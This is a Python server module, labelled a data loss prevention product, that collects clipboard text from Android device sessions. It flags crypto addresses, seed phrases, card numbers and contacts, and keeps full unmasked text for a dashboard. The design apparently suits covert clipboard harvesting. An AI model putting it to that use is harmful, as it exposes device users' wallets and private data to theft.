"""
ATHEX DLP Enterprise - Clipboard Module
========================================
Processes clipboard data from Android devices.
"""

import json
import logging
import re
from datetime import datetime
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class ClipboardHandler:
    """Handles clipboard data processing"""
    
    # Sensitive data patterns
    PATTERNS = {
        "bitcoin": r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b",
        "ethereum": r"\b0x[a-fA-F0-9]{40}\b",
        "credit_card": r"\b\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{4}\b",
        "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
        "url": r"https?://[^\s]+",
        "phone": r"\+?[\d\s\-\(\)]{7,15}",
        "seed_phrase": r"\b([a-z]+\s){11,23}[a-z]+\b"
    }
    
    def __init__(self):
        self.clipboard_history: Dict[str, List[Dict]] = {}
        self.max_history = 200
        logger.info("ClipboardHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process clipboard data from device.
        
        Args:
            session_id: Device session ID
            raw_data: Raw clipboard text
            
        Returns:
            Processed clipboard data with detections
        """
        try:
            if isinstance(raw_data, str):
                text = raw_data
            elif isinstance(raw_data, dict):
                text = raw_data.get("text", raw_data.get("data", str(raw_data)))
            else:
                text = str(raw_data)
            
            # Process
            processed = {
                "session_id": session_id,
                "text": text,
                "length": len(text),
                "timestamp": datetime.now().isoformat(),
                "detections": self._detect_sensitive_data(text),
                "truncated": text[:200] + "..." if len(text) > 200 else text
            }
            
            # Add to history
            if session_id not in self.clipboard_history:
                self.clipboard_history[session_id] = []
            
            # Avoid duplicates
            if not self.clipboard_history[session_id] or \
               self.clipboard_history[session_id][-1].get("text") != text:
                self.clipboard_history[session_id].append(processed)
            
            # Trim history
            if len(self.clipboard_history[session_id]) > self.max_history:
                self.clipboard_history[session_id] = \
                    self.clipboard_history[session_id][-self.max_history:]
            
            if processed["detections"]:
                logger.info(f"📋 Clipboard: {len(processed['detections'])} sensitive items detected from {session_id}")
            
            return {
                "success": True,
                "clipboard": processed,
                "has_sensitive": len(processed["detections"]) > 0
            }
            
        except Exception as e:
            logger.error(f"Error processing clipboard: {e}")
            return {"success": False, "error": str(e)}
    
    def _detect_sensitive_data(self, text: str) -> List[Dict]:
        """Detect sensitive data in text"""
        detections = []
        
        for data_type, pattern in self.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                # Mask sensitive data
                if isinstance(match, tuple):
                    match = match[0]
                
                masked = self._mask_data(match, data_type)
                
                detections.append({
                    "type": data_type,
                    "value": masked,
                    "length": len(match)
                })
        
        return detections
    
    def _mask_data(self, data: str, data_type: str) -> str:
        """Mask sensitive data for display"""
        if len(data) < 8:
            return "****"
        
        if data_type in ["bitcoin", "ethereum"]:
            return data[:6] + "..." + data[-4:]
        elif data_type == "credit_card":
            return data[:4] + "-****-****-" + data[-4:]
        elif data_type == "email":
            parts = data.split("@")
            if len(parts) == 2:
                return parts[0][:2] + "***@" + parts[1]
        elif data_type == "phone":
            return data[:3] + "****" + data[-3:]
        
        return data[:3] + "***" + data[-3:]
    
    def get_history(self, session_id: str, limit: int = 20) -> List[Dict]:
        """Get clipboard history"""
        history = self.clipboard_history.get(session_id, [])
        return history[-limit:]
    
    def format_for_dashboard(self, history: List[Dict]) -> List[Dict]:
        """Format clipboard for dashboard display"""
        dashboard = []
        
        for entry in history:
            dashboard.append({
                "time": entry.get("timestamp", "")[-8:] if entry.get("timestamp") else "",
                "text": entry.get("truncated", ""),
                "length": entry.get("length", 0),
                "sensitive_count": len(entry.get("detections", [])),
                "detections": entry.get("detections", [])
            })
        
        return dashboard


clipboard_handler = ClipboardHandler()